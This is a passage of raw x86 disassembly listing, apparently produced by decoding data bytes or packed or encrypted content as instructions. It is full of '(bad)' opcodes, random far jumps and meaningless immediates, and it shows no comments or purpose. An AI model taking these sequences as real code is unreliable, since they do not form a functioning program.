  40509b:	cs and eax,0x15d2b635
  4050a1:	(bad)  
  4050a2:	retf   
  4050a3:	lds    ecx,FWORD PTR [esp+ebx*4+0xbbfbd43]
  4050aa:	int3   
  4050ab:	push   cs
  4050ac:	and    esp,ebx
  4050ae:	dec    eax
  4050af:	jb     0x405088
  4050b1:	and    dl,BYTE PTR [eax]
  4050b3:	imul   ecx,eax,0xfffffffe
  4050b6:	mov    cl,0xae
  4050b8:	mov    ch,0xad
  4050ba:	xchg   esp,eax
  4050bb:	mov    cl,0xe2
  4050bd:	pop    es
  4050be:	int3   
  4050bf:	mov    ch,0x3c
  4050c1:	push   esi
  4050c2:	dec    ebp
  4050c3:	retf   
  4050c4:	mov    esi,0x3adfd7ca
  4050c9:	mov    edi,0x25db7a43
  4050ce:	cwde   
  4050cf:	sbb    al,0x38
  4050d1:	cli    
  4050d2:	xor    eax,0xf569d186
  4050d7:	sbb    BYTE PTR [ecx-0x494f9b91],cl
  4050dd:	jecxz  0x4050e2
  4050df:	fidiv  DWORD PTR ds:0xc468a003
  4050e5:	add    bl,bh
  4050e7:	xchg   edx,eax
  4050e8:	repnz mov ah,BYTE PTR [esi]
  4050eb:	in     eax,dx
  4050ec:	outs   dx,BYTE PTR ds:[esi]
  4050ed:	pop    ds
  4050ee:	jne    0x405155
  4050f0:	(bad)  
  4050f1:	cld    
  4050f2:	jns    0x405121
  4050f4:	cmp    ebp,DWORD PTR [ebx+ecx*4]
  4050f7:	dec    edi
  4050f8:	jmp    0xd2c5:0x8fd699ab
  4050ff:	sbb    BYTE PTR [edi],dh
  405101:	imul   edx,DWORD PTR [ebp-0x1a],0xf9a28a70
  405108:	jp     0x40511d
  40510a:	sbb    al,0x4e
  40510c:	add    dl,BYTE PTR fs:[edi-0xa5aa25b]
  405113:	ins    DWORD PTR es:[edi],dx
  405114:	sub    edx,DWORD PTR [ecx+ebx*1+0x7f]
  405118:	mov    eax,0xcb02416c
  40511d:	in     al,dx
  40511e:	sbb    ah,BYTE PTR [edi]
  405120:	add    DWORD PTR [eax+0x69cb1f5d],ebp
  405126:	mov    bh,0x9f
  405128:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405129:	cmp    BYTE PTR [ebx+0x4f],0xe4
  40512d:	sub    al,0x71
  40512f:	mov    esp,0xf26d5bbd
  405134:	pop    eax
  405135:	clc    
  405136:	(bad)  
  405137:	lea    edi,[eax+0x4685a609]
  40513d:	mov    bl,0x46
  40513f:	(bad)  
  405140:	out    0x3a,eax
  405142:	dec    eax
  405143:	pushf  
  405144:	sbb    BYTE PTR [edi+0x7751d3b5],bh
  40514a:	push   esp
  40514b:	fistp  DWORD PTR [esi]
  40514d:	or     BYTE PTR [ebp-0x57edd60c],cl
  405153:	(bad)  
  405154:	pop    eax
  405155:	mov    ah,0xd
  405157:	push   edx
  405158:	in     al,dx
  405159:	xchg   edx,ecx
  40515b:	push   edi
  40515c:	mov    ebp,0x317f7b20
  405161:	mov    al,0xbd
  405163:	pop    esp
  405164:	cmp    eax,0x331e25cd
  405169:	fnstcw WORD PTR [ebx*1+0x7b2025ef]
  405170:	jbe    0x40515a
  405172:	sbb    bh,BYTE PTR [ecx+eax*4+0x3598e68b]
  405179:	test   eax,0x1897eeda
  40517e:	loopne 0x4051b0
  405180:	jl     0x40511d
  405182:	xor    ebx,esp
  405184:	scas   eax,DWORD PTR es:[edi]
  405185:	repnz mov ch,0x53
  405188:	pop    esi
  405189:	(bad)  
  40518a:	fbstp  TBYTE PTR [ecx-0x1f]
  40518d:	push   ebp
  40518e:	data16 ins BYTE PTR es:[edi],dx
  405190:	jmp    0xe63167a1
  405195:	or     ebx,DWORD PTR [esi+edi*1+0x49ec7176]
  40519c:	mov    ah,BYTE PTR [esi+eiz*8-0x6d]
  4051a0:	(bad)  
  4051a1:	ror    DWORD PTR [edx+0x78502bb5],cl
  4051a7:	mov    dl,0xc
  4051a9:	push   eax
  4051aa:	push   ebp
  4051ab:	push   0x5e72ea05
  4051b0:	in     eax,dx
  4051b1:	int    0xeb
  4051b3:	lock scas al,BYTE PTR es:[edi]
  4051b5:	xlat   BYTE PTR ds:[ebx]
  4051b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051b7:	inc    edi
  4051b8:	(bad)  
  4051b9:	aad    0x82
  4051bb:	pop    es
  4051bc:	sub    al,0x4a
  4051be:	mov    ah,0x51
  4051c0:	mov    ebx,0x68004ac
  4051c5:	pushf  
  4051c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051c7:	popa   
  4051c8:	(bad)  
  4051c9:	cmp    ah,BYTE PTR [eax]
  4051cb:	outs   dx,DWORD PTR ds:[esi]
  4051cc:	push   ebx
  4051cd:	rcr    BYTE PTR [ebp+0x22436100],cl
  4051d3:	jmp    0x40523f
  4051d5:	and    esi,DWORD PTR [ebp-0x12]
  4051d8:	orps   xmm6,XMMWORD PTR [eax]
  4051db:	jmp    0x385967e1
  4051e0:	aaa    
  4051e1:	xchg   esp,eax
  4051e2:	xor    cl,BYTE PTR [eax-0x14]
  4051e5:	mov    ah,0xf0
  4051e7:	out    0xb5,eax
  4051e9:	jae    0x40523d
  4051eb:	jp     0x4051eb
  4051ed:	xchg   esi,eax
  4051ee:	inc    esp
  4051ef:	inc    eax
  4051f0:	cmp    esi,DWORD PTR [ecx+0x7812f885]
  4051f6:	push   eax
  4051f7:	push   0x2cd66c82
  4051fc:	fnsave [eax-0x48]
  4051ff:	jp     0x4051af
  405201:	xor    bl,al
  405203:	jmp    0x4051e7
  405205:	mov    eax,0xa27d505b
  40520a:	in     al,0x24
  40520c:	mov    dl,0x2e
  40520e:	add    edi,ecx
  405210:	test   al,0xbc
  405212:	out    dx,al
  405213:	dec    esi
  405214:	out    dx,al
  405215:	inc    esi
  405216:	dec    ebx
  405217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405218:	xor    al,0xfa
  40521a:	in     al,dx
  40521b:	sbb    ch,BYTE PTR [ebx-0x6a227bf7]
  405221:	inc    esi
  405222:	xchg   ebx,eax
  405223:	sub    esi,DWORD PTR [eax]
  405225:	rol    BYTE PTR [ebx+eiz*1],0x7c
  405229:	push   ss
  40522a:	dec    edi
  40522b:	test   BYTE PTR [eax-0xe7f667],dh
  405231:	sar    DWORD PTR [esi+0x1f1a9494],1
  405237:	fisubr DWORD PTR [ecx+0x20]
  40523a:	adc    al,0x8e
  40523c:	jbe    0x4052b2
  40523e:	fild   QWORD PTR [ebx]
  405240:	sub    ebx,esp
  405242:	stos   BYTE PTR es:[edi],al
  405243:	push   es
  405244:	retf   0xbf99
  405247:	sbb    DWORD PTR ds:[esi-0x7bbb5a6],0xffffffa4
  40524f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405250:	div    DWORD PTR ds:0x8a90ed85
  405256:	cli    
  405257:	sti    
  405258:	cmp    BYTE PTR [eax-0x4],dh
  40525b:	add    DWORD PTR [eax-0x1a],esp
  40525e:	and    al,0x7a
  405260:	cdq    
  405261:	jle    0x40521b
  405263:	sbb    BYTE PTR [esi-0x74db7531],cl
  405269:	aam    0xdd
  40526b:	lahf   
  40526c:	sub    edi,eax
  40526e:	jns    0x405233
  405270:	sub    eax,0x6263563b
  405275:	js     0x40520a
  405277:	or     al,0x3c
  405279:	ficomp DWORD PTR [edi]
  40527b:	pop    ss
  40527c:	cmp    dl,BYTE PTR [edx+0x6a834bce]
  405282:	adc    dl,dh
  405284:	mov    bh,0xff
  405286:	fbld   TBYTE PTR ds:0x6114f0ce
  40528c:	cmp    BYTE PTR [edi+0x51],0x9c
  405290:	sub    eax,0x8d1e4dab
  405295:	in     eax,dx
  405296:	sbb    ebx,ebp
  405298:	imul   edi,edx,0x1f4a3369
  40529e:	cld    
  40529f:	jg     0x40526e
  4052a1:	xchg   ebp,esi
  4052a3:	mov    edi,0xd6f79985
  4052a8:	push   esp
  4052a9:	jp     0x405245
  4052ab:	int    0xb0
  4052ad:	and    eax,0x5fb83ecb
  4052b2:	or     bh,BYTE PTR [edi+0x3f931b0a]
  4052b8:	aam    0x90
  4052ba:	mov    fs,WORD PTR [ecx]
  4052bc:	or     eax,0x3a66bc77
  4052c1:	std    
  4052c2:	sub    eax,0x9ec28d73
  4052c7:	jmp    0x40529a
  4052c9:	add    al,0x2d
  4052cb:	jg     0x405284
  4052cd:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4052cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4052d0:	scas   eax,DWORD PTR es:[edi]
  4052d1:	dec    eax
  4052d2:	xchg   esi,eax
  4052d3:	mov    dh,0x1d
  4052d5:	not    DWORD PTR [edi-0x55]
  4052d8:	push   ds
  4052d9:	push   ebx
  4052da:	data16 mov cl,0xc5
  4052dd:	repz mov dl,0x6e
  4052e0:	pop    eax
  4052e1:	add    DWORD PTR [eax+0x6308e0b8],ebx
  4052e7:	fldenv [esp+esi*8]
  4052ea:	mov    esp,0x5ceb4565
  4052ef:	jne    0x4052a2
  4052f1:	dec    esp
  4052f2:	scas   al,BYTE PTR es:[edi]
  4052f3:	retf   0xd6b6
  4052f6:	outs   dx,DWORD PTR ds:[esi]
  4052f7:	sbb    esp,DWORD PTR [edi+0xf8f5694]
  4052fd:	fstp   TBYTE PTR [eax]
  4052ff:	sbb    DWORD PTR [eax+0x76],ebx
  405302:	mov    ecx,0xe9b14c02
  405307:	test   BYTE PTR [edx-0x6c],al
  40530a:	jo     0x40530c
  40530c:	cwde   
  40530d:	push   ebp
  40530e:	mov    ds,WORD PTR [esi-0x272e3f34]
  405314:	div    BYTE PTR ds:0x5b077d44
  40531a:	xlat   BYTE PTR ds:[ebx]
  40531b:	mov    eax,0x108fc1cf
  405320:	(bad)  
  405321:	mov    eax,DWORD PTR [ecx+0x1e]
  405324:	sbb    BYTE PTR [edi],al
  405326:	mov    cl,0x60
  405328:	inc    edx
  405329:	aaa    
  40532a:	(bad)  
  40532b:	sti    
  40532c:	mov    al,ds:0x77333e88
  405331:	inc    esp
  405332:	jmp    0xefdb:0x9322ff
  405339:	(bad)  
  40533a:	sbb    edx,DWORD PTR [ebp-0x28]
  40533d:	sub    DWORD PTR [ecx-0x7a680988],0xffffff9e
  405344:	push   0xf231208c
  405349:	mov    ebx,0x4eb8124e
  40534e:	fwait
  40534f:	cmp    al,bl
  405351:	push   esp
  405352:	out    dx,al
  405353:	xor    al,0x4c
  405355:	gs pushf 
  405357:	mov    esp,0xd397462d
  40535c:	mov    eax,0x4aa5d713
  405361:	sbb    eax,0x882e54c2
  405366:	jns    0x4052ef
  405368:	jmp    0xda35e9de
  40536d:	sub    al,0xbb
  40536f:	or     eax,0xff9a3616
  405374:	bound  ecx,QWORD PTR [eax+0x27]
  405377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405378:	sti    
  405379:	ret    0xff37
  40537c:	aam    0x70
  40537e:	(bad)  
  40537f:	or     eax,0x149d3323
  405384:	mov    ds:0xc53e23ea,al
  405389:	push   ebp
  40538a:	or     edx,ebx
  40538c:	rol    BYTE PTR [ebx],1
  40538e:	jp     0x4053db
  405390:	pop    eax
  405391:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405392:	outs   dx,BYTE PTR ds:[esi]
  405393:	and    DWORD PTR [ebp+0x3037d761],ebp
  405399:	push   edx
  40539a:	iret   
  40539b:	retf   
  40539c:	popf   
  40539d:	jecxz  0x405379
  40539f:	cmp    al,0xdf
  4053a1:	je     0x405342
  4053a3:	enter  0xac58,0xbf
  4053a7:	rol    edi,0x97
  4053aa:	mov    bh,0xb7
  4053ac:	dec    ecx
  4053ad:	sub    edi,ebx
  4053af:	push   0x24
  4053b1:	fstp   DWORD PTR [edi-0x7d]
  4053b4:	mov    ecx,0x473adfff
  4053b9:	and    BYTE PTR [esi-0x47],bl
  4053bc:	out    0xe,al
  4053be:	add    DWORD PTR [eax-0x10],esp
  4053c1:	(bad)  
  4053c2:	les    edi,FWORD PTR [edx-0x5e6a3d7c]
  4053c8:	and    BYTE PTR [ebx+0x18],cl
  4053cb:	cmc    
  4053cc:	fwait
  4053cd:	pop    edi
  4053ce:	rcl    DWORD PTR [ebx],1
  4053d0:	lds    ecx,FWORD PTR [edx-0x4e]
  4053d3:	loop   0x40538f
  4053d5:	cmp    eax,0xb60c56e0
  4053da:	jmp    0x8deb:0x9f07582c
  4053e1:	mov    BYTE PTR [ecx+0x7ab8156f],dl
  4053e7:	push   esp
  4053e8:	repnz inc esi
  4053ea:	es stos DWORD PTR es:[edi],eax
  4053ec:	sub    al,0x1d
  4053ee:	(bad)  
  4053ef:	iret   
  4053f0:	and    bl,BYTE PTR [eax+0x7cdd25]
  4053f6:	mov    edx,0xde963ede
  4053fb:	sub    DWORD PTR [eax],0xfaca4a53
  405401:	mov    ?,WORD PTR [ebx+0x15d7bd2b]
  405407:	mov    bh,ch
  405409:	sbb    DWORD PTR [ebp-0x1334a479],esp
  40540f:	fwait
  405410:	jmp    0x405441
  405412:	lds    ecx,FWORD PTR [edx-0x79]
  405415:	cwde   
  405416:	jmp    0x40540e
  405418:	(bad)  
  405419:	adc    BYTE PTR [esi-0x5c2eb6f5],ah
  40541f:	fld    DWORD PTR [esi+0x2d5bf8d9]
  405425:	jne    0x4053dc
  405427:	std    
  405428:	mov    esp,0x92463a70
  40542d:	inc    edx
  40542e:	sbb    al,0x7c
  405430:	jmp    0xcf8eab86
  405435:	fldenv [edi]
  405437:	(bad)  
  405438:	clc    
  405439:	jl     0x4053c9
  40543b:	lods   al,BYTE PTR ds:[esi]
  40543c:	jg     0x405454
  40543e:	hlt    
  40543f:	adc    DWORD PTR [esi],ecx
  405441:	xchg   esi,eax
  405442:	jmp    0x405429
  405444:	or     eax,0x90d6f180
  405449:	xchg   BYTE PTR [edi],bh
  40544b:	adc    edx,DWORD PTR [esi]
  40544d:	repz repnz pop esp
  405450:	inc    ebx
  405451:	fistp  WORD PTR [eax]
  405453:	arpl   WORD PTR [ebx],cx
  405455:	adc    esp,esp
  405457:	outs   dx,BYTE PTR ds:[esi]
  405458:	or     ah,al
  40545a:	popa   
  40545b:	inc    ebp
  40545c:	and    BYTE PTR [ecx-0x67],bl
  40545f:	mov    bl,0x10
  405461:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405462:	add    bh,al
  405464:	int    0xd9
  405466:	pop    edi
  405467:	fist   DWORD PTR [ebx+edi*8-0x11]
  40546b:	les    esp,FWORD PTR [edx-0x4f6936b2]
  405471:	xchg   edi,eax
  405472:	cli    
  405473:	mov    cl,0xae
  405475:	aad    0xb1
  405477:	mov    ebp,0xfa7e67b4
  40547c:	aaa    
  40547d:	pushf  
  40547e:	js     0x40542c
  405480:	mov    ch,0xa4
  405482:	imul   ecx,DWORD PTR [eax+0x121631e8],0x168be48a
  40548c:	mov    DWORD PTR [edi+edx*8+0x6],ebp
  405490:	std    
  405491:	lods   al,BYTE PTR ds:[esi]
  405492:	repz xor ecx,DWORD PTR [eax]
  405495:	sbb    al,0x69
  405497:	pop    esp
  405498:	mov    ds:0xe4c1487c,al
  40549d:	int3   
  40549e:	call   0x6ec0080f
  4054a3:	daa    
  4054a4:	cmp    al,0x92
  4054a6:	push   ebx
  4054a7:	sbb    eax,DWORD PTR [edi]
  4054a9:	test   BYTE PTR [esi],0x7
  4054ac:	sar    DWORD PTR [ecx+0x67d4dc75],0xb1
  4054b3:	xor    DWORD PTR [eax-0x795733f5],edi
  4054b9:	retf   0xe5f6
  4054bc:	sub    eax,0x60bd2a43
  4054c1:	add    ecx,ebx
  4054c3:	pop    edx
  4054c4:	dec    eax
  4054c5:	icebp  
  4054c6:	imul   esi,DWORD PTR [edx+0x79],0xffffff90
  4054ca:	push   ecx
  4054cb:	jg     0x4054ea
  4054cd:	daa    
  4054ce:	push   edi
  4054cf:	inc    ebp
  4054d0:	pop    es
  4054d1:	adc    DWORD PTR [ebx],ebx
  4054d3:	mov    BYTE PTR [ebp-0x5c0c2f35],cl
  4054d9:	lods   al,BYTE PTR ds:[esi]
  4054da:	into   
  4054db:	jg     0x405536
  4054dd:	std    
  4054de:	jb     0x405515
  4054e0:	ja     0x405538
  4054e2:	xlat   BYTE PTR ds:[ebx]
  4054e3:	test   ch,bh
  4054e5:	div    cl
  4054e7:	fadd   DWORD PTR [ebp-0x2ce3a90e]
  4054ed:	or     dh,cl
  4054ef:	sbb    eax,0xc030b560
  4054f4:	enter  0x144e,0x41
  4054f8:	sti    
  4054f9:	pusha  
  4054fa:	stc    
  4054fb:	loope  0x405508
  4054fd:	cwde   
  4054fe:	mov    eax,ds:0x194af898
  405503:	add    edi,DWORD PTR [ebx+0x5a]
  405506:	out    0x7e,al
  405508:	int3   
  405509:	mov    eax,0x58cdb43e
  40550e:	daa    
  40550f:	xor    bl,BYTE PTR [ebx+0x21]
  405512:	aas    
  405513:	cmp    dh,BYTE PTR [ebx-0x26ffb488]
  405519:	add    al,0xf6
  40551b:	pusha  
  40551c:	das    
  40551d:	sbb    BYTE PTR [ecx+0xfc66757],0x3d
  405524:	sub    al,0x1b
  405526:	jne    0x405553
  405528:	sub    ebx,DWORD PTR [ebx-0x584c6b2b]
  40552e:	mov    ds:0xd3d1178,al
  405533:	jmp    0x1c53:0xbcc4fe6d
  40553a:	mov    eax,ds:0x42d9c6ed
  40553f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405540:	mov    dl,0xfa
  405542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405543:	fild   DWORD PTR [edi+0x5c]
  405546:	xor    ch,bh
  405548:	jb     0x40557b
  40554a:	inc    ecx
  40554b:	push   esi
  40554c:	inc    edx
  40554d:	fs or  eax,0xb508cbc3
  405553:	loop   0x40551f
  405555:	out    dx,eax
  405556:	lds    ebx,FWORD PTR [edi+esi*2+0x4b286a0]
  40555d:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40555f:	aad    0xfb
  405561:	push   es
  405562:	xchg   ebx,eax
  405563:	add    al,0x17
  405565:	fadd   DWORD PTR ds:0x1c951979
  40556b:	or     eax,ebx
  40556d:	mov    cl,BYTE PTR ds:0x3e8e5938
  405573:	jne    0x405553
  405575:	and    ch,bl
  405577:	mov    ah,0xd8
  405579:	mov    edx,0xbf04a6d4
  40557e:	into   
  40557f:	out    0x83,eax
  405581:	not    BYTE PTR [eax-0x63]
  405584:	dec    edx
  405585:	add    eax,0x57ae884b
  40558a:	xor    edi,esp
  40558c:	leave  
  40558d:	rol    DWORD PTR [edx],0xf9
  405590:	popa   
  405591:	mov    ds:0x8f392eb7,eax
  405596:	fs and eax,edx
  405599:	jge    0x405539
  40559b:	mov    BYTE PTR [ecx+0x6e],al
  40559e:	cli    
  40559f:	mov    ds:0xc835dfa9,al
  4055a4:	lods   eax,DWORD PTR ds:[esi]
  4055a5:	mov    esi,0xc61e2cb0
  4055aa:	mov    edx,0xce74dfbe
  4055af:	lods   al,BYTE PTR ds:[esi]
  4055b0:	and    DWORD PTR [edi+0x4c],ebx
  4055b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055b4:	fdiv   st,st(4)
  4055b6:	jo     0x405625
  4055b8:	cwde   
  4055b9:	jle    0x405551
  4055bb:	icebp  
  4055bc:	xor    DWORD PTR [esi-0x5b],ecx
  4055bf:	mov    edi,0x4a27ba6
  4055c4:	jl     0x4055ac
  4055c6:	and    BYTE PTR [edx-0x30947f12],ch
  4055cc:	mov    DWORD PTR [eax-0x762988b9],eax
  4055d2:	stc    
  4055d3:	mov    ebp,0xe6793602
  4055d8:	addr16 std 
  4055da:	lock dec eax
  4055dc:	jl     0x4055cc
  4055de:	pushf  
  4055df:	dec    edi
  4055e0:	or     eax,eax
  4055e2:	lock aaa 
  4055e4:	pop    eax
  4055e5:	mov    ch,BYTE PTR [ebp-0x1d]
  4055e8:	push   0x5a
  4055ea:	mov    cl,0xe7
  4055ec:	icebp  
  4055ed:	sbb    al,0x64
  4055ef:	push   cs
  4055f0:	jmp    0xca7f3ec9
  4055f5:	add    ch,bl
  4055f7:	out    dx,eax
  4055f8:	je     0x405603
  4055fa:	addr16 pop esp
  4055fc:	sbb    eax,0x134c4ca7
  405602:	jmp    0xa8b014e6
  405607:	fsubp  st(6),st
  405609:	inc    esi
  40560a:	mov    esi,DWORD PTR [edx]
  40560c:	stc    
  40560d:	lock pop eax
  40560f:	and    al,0x25
  405611:	mov    WORD PTR [ebx+0x785261f4],cs
  405617:	and    eax,0xc17c3d7b
  40561c:	in     eax,0x1
  40561e:	dec    esi
  40561f:	jmp    0xfcd1:0x951b86f1
  405626:	add    BYTE PTR [eax+0x1058550f],ah
  40562c:	es jbe 0x4055d9
  40562f:	mov    ebp,0xbf74ba82
  405634:	div    ebx
  405636:	mov    eax,0x374358c3
  40563b:	push   ss
  40563c:	les    esp,FWORD PTR [edx+0x55]
  40563f:	jae    0x4055c1
  405641:	gs sub al,0x66
  405644:	xor    al,0x45
  405646:	xor    eax,0xe94ea1a
  40564b:	in     al,dx
  40564c:	call   0x451cfc43
  405651:	ss cld 
  405653:	inc    eax
  405654:	mov    gs,WORD PTR [edi+0x78e6821a]
  40565a:	xor    ebp,ebp
  40565c:	cdq    
  40565d:	sbb    al,0xa4
  40565f:	sbb    eax,0x164ac90f
  405664:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405666:	inc    esi
  405667:	cmp    eax,0xe310b552
  40566c:	push   ebp
  40566d:	pop    ebx
  40566e:	loop   0x405659
  405670:	pop    ds
  405671:	mov    dh,0xb0
  405673:	les    esi,FWORD PTR [edi+eiz*1+0x6bd68952]
  40567a:	and    ah,0xa4
  40567d:	mov    BYTE PTR [edi-0x46f64fa9],al
  405683:	arpl   dx,bx
  405685:	paddw  mm3,mm4
  405688:	sub    DWORD PTR [esi+0x209cfa6],eax
  40568e:	sub    al,0x80
  405690:	shl    DWORD PTR [edi+0x1b522b82],cl
  405696:	mov    ebp,0xf762d86a
  40569b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40569c:	jmp    0x7e03996f
  4056a1:	mov    ch,0xd8
  4056a3:	loopne 0x40564f
  4056a5:	ins    DWORD PTR es:[edi],dx
  4056a6:	hlt    
  4056a7:	in     al,0x9d
  4056a9:	push   ds
  4056aa:	aad    0x98
  4056ac:	cmp    al,0x3
  4056ae:	retf   
  4056af:	mov    ebx,0x7c494578
  4056b4:	test   BYTE PTR [ecx+0x66ed76c1],bl
  4056ba:	mov    esp,DWORD PTR [ebp+0x5d]
  4056bd:	mov    edi,0x36456c80
  4056c2:	mov    esi,0x6b2446e2
  4056c7:	loop   0x40571f
  4056c9:	cmp    al,0x3f
  4056cb:	push   cs
  4056cc:	jl     0x4056de
  4056ce:	(bad)  
  4056cf:	pusha  
  4056d0:	and    ah,BYTE PTR [ecx-0x5c]
  4056d3:	pushf  
  4056d4:	fld    QWORD PTR [ecx-0x6e41e4e4]
  4056da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056db:	jno    0x4056b6
  4056dd:	pop    eax
  4056de:	test   DWORD PTR [ebp+0x3f],edx
  4056e1:	stos   DWORD PTR es:[edi],eax
  4056e2:	dec    edi
  4056e3:	retf   
  4056e4:	jmp    0x7177:0xeb0b152e
  4056eb:	lahf   
  4056ec:	out    0xfc,eax
  4056ee:	sti    
  4056ef:	ficom  WORD PTR [ebp+eax*1-0x5410269e]
  4056f6:	sub    DWORD PTR [eax],ebx
  4056f8:	ins    DWORD PTR es:[edi],dx
  4056f9:	cmc    
  4056fa:	mov    al,0xbf
  4056fc:	mov    DWORD PTR [edx+0x6a674985],edi
  405702:	jg     0x4056e4
  405704:	shl    BYTE PTR [edx+edx*1+0x14c818de],1
  40570b:	cmp    eax,esi
  40570d:	fxch   st(0)
  40570f:	pop    ebp
  405710:	xchg   edi,eax
  405711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405712:	das    
  405713:	jb     0x40573b
  405715:	xchg   DWORD PTR [ecx-0x6197d584],esp
  40571b:	arpl   si,bp
  40571d:	jns    0x40573f
  40571f:	adc    eax,0xdcc38778
  405724:	je     0x405758
  405726:	aaa    
  405727:	cmp    al,0xc9
  405729:	or     DWORD PTR [esp+edx*8+0x12a7a294],esi
  405730:	sub    ah,dh
  405732:	mov    eax,ds:0x8612dd51
  405737:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405739:	sbb    dh,bh
  40573b:	mov    ebp,0x4debea6e
  405740:	mov    edx,0x4c2ecb06
  405745:	jbe    0x40572a
  405747:	mov    al,0x36
  405749:	cmp    BYTE PTR [esi+0x1b],bl
  40574c:	dec    edx
  40574d:	push   ebx
  40574e:	(bad)  
  40574f:	addr16 cli 
  405751:	push   ds
  405752:	(bad)  
  405753:	js     0x40578b
  405755:	push   edi
  405756:	rol    BYTE PTR [eax+0x1051b97c],1
  40575c:	ins    DWORD PTR es:[edi],dx
  40575d:	fwait
  40575e:	sub    eax,0xba819c4b
  405763:	jnp    0x40575e
  405765:	pop    ds
  405766:	ret    0xd5b7
  405769:	and    DWORD PTR [edi+0x46],eax
  40576c:	repnz shr DWORD PTR [edx],cl
  40576f:	jge    0x4057d4
  405771:	inc    ecx
  405772:	iret   
  405773:	ds mov edi,0x3cb3352f
  405779:	popf   
  40577a:	ins    BYTE PTR es:[edi],dx
  40577b:	jl     0x405728
  40577d:	inc    ecx
  40577e:	xchg   BYTE PTR [edi+0x1e6e5de],cl
  405784:	stc    
  405785:	test   DWORD PTR [ebp-0x57],esi
  405788:	loop   0x40579c
  40578a:	dec    ebp
  40578b:	loopne 0x405801
  40578d:	mov    cl,0xc8
  40578f:	push   es
  405790:	adc    BYTE PTR [ebx],ah
  405792:	pop    ecx
  405793:	xlat   BYTE PTR ds:[ebx]
  405794:	inc    eax
  405795:	pop    edx
  405796:	lock cdq 
  405798:	lock neg DWORD PTR [edx]
  40579b:	or     DWORD PTR [ebx+eiz*2+0x391ae7d7],esp
  4057a2:	adc    eax,0xf39e22d1
  4057a7:	out    0x29,al
  4057a9:	cmp    al,dl
  4057ab:	sbb    ebx,DWORD PTR [ebp-0x78]
  4057ae:	scas   al,BYTE PTR es:[edi]
  4057af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4057b0:	jp     0x4057f9
  4057b2:	mov    esi,0x151c88ea
  4057b7:	ins    DWORD PTR es:[edi],dx
  4057b8:	ror    DWORD PTR [ebx],1
  4057ba:	mov    ch,0xc9
  4057bc:	iret   
  4057bd:	xchg   DWORD PTR [edx-0x34],eax
  4057c0:	mov    ds:0xb2ea555c,eax
  4057c5:	stos   BYTE PTR es:[edi],al
  4057c6:	xor    BYTE PTR [ecx+0x5d98acaf],bh
  4057cc:	aas    
  4057cd:	retf   
  4057ce:	cdq    
  4057cf:	les    esp,FWORD PTR [eax]
  4057d1:	lahf   
  4057d2:	jmp    0xb6d2a45a
  4057d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d8:	sahf   
  4057d9:	sub    DWORD PTR [ecx+0x467c86c6],ecx
  4057df:	push   ds
  4057e0:	push   ss
  4057e1:	ss inc edx
  4057e3:	dec    esp
  4057e4:	popf   
  4057e5:	mov    edi,edi
  4057e7:	jmp    0x4057d7
  4057e9:	xchg   bl,ch
  4057eb:	call   0xd02a:0xe6ccced9
  4057f2:	xor    ecx,esi
  4057f4:	and    edi,DWORD PTR [ebp+0x62]
  4057f7:	push   ecx
  4057f8:	pop    eax
  4057f9:	adc    al,0x1d
  4057fb:	js     0x4057e1
  4057fd:	les    eax,FWORD PTR [edi-0x6725f359]
  405803:	outs   dx,DWORD PTR ds:[esi]
  405804:	sub    ebx,DWORD PTR [esi+0x24cd4878]
  40580a:	jmp    0x4ad0d517
  40580f:	int3   
  405810:	test   DWORD PTR [edi-0x6b10db3e],ecx
  405816:	scas   eax,DWORD PTR es:[edi]
  405817:	and    eax,0x23be256c
  40581c:	imul   BYTE PTR [ebx+0x3d]
  40581f:	push   ebx
  405820:	or     edi,DWORD PTR [edx+0x2b]
  405823:	jg     0x4057c5
  405825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405826:	imul   esp,DWORD PTR [esi-0x55549c86],0x3bda3415
  405830:	xor    edx,DWORD PTR [ecx-0x2f547142]
  405836:	test   al,0xb2
  405838:	mov    DWORD PTR [edx],edx
  40583a:	mov    ds:0x71c3dc63,eax
  40583f:	sub    esp,DWORD PTR [esi-0x15]
  405842:	je     0x405878
  405844:	(bad)  
  405846:	ins    DWORD PTR es:[edi],dx
  405847:	xchg   edi,eax
  405848:	mov    ds:0x6f5e520,al
  40584d:	mov    fs,WORD PTR [edi+0x36]
  405850:	cmc    
  405851:	scas   al,BYTE PTR es:[edi]
  405852:	or     ah,BYTE PTR [ecx+0x477b1f70]
  405858:	xchg   ebx,eax
  405859:	(bad)  
  40585a:	or     edi,DWORD PTR [ebp-0x39]
  40585d:	cmp    al,0x3f
  40585f:	arpl   WORD PTR [esi+0xcbb366b],bp
  405865:	hlt    
  405866:	shr    DWORD PTR [edi+0x41],cl
  405869:	fild   QWORD PTR [edx]
  40586b:	repz cmp al,BYTE PTR ds:[ebx+0x99131f1]
  405873:	mov    dh,0x36
  405875:	and    BYTE PTR [ebp-0x49],dl
  405878:	sub    ch,BYTE PTR [eax-0x12d59667]
  40587e:	inc    ebx
  40587f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405880:	lea    esp,[edx]
  405882:	pop    ecx
  405883:	call   0x9d83:0xda42b9ad
